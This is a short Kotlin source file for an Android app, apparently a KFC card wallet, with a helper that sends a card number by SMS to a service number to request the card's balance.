
package com.example.kfcvault
import android.telephony.SmsManager
object SmsHelper {
    fun sendBalanceSms(cardNumber: String) {
        SmsManager.getDefault().sendTextMessage("55757575", null, cardNumber, null, null)
    }
}
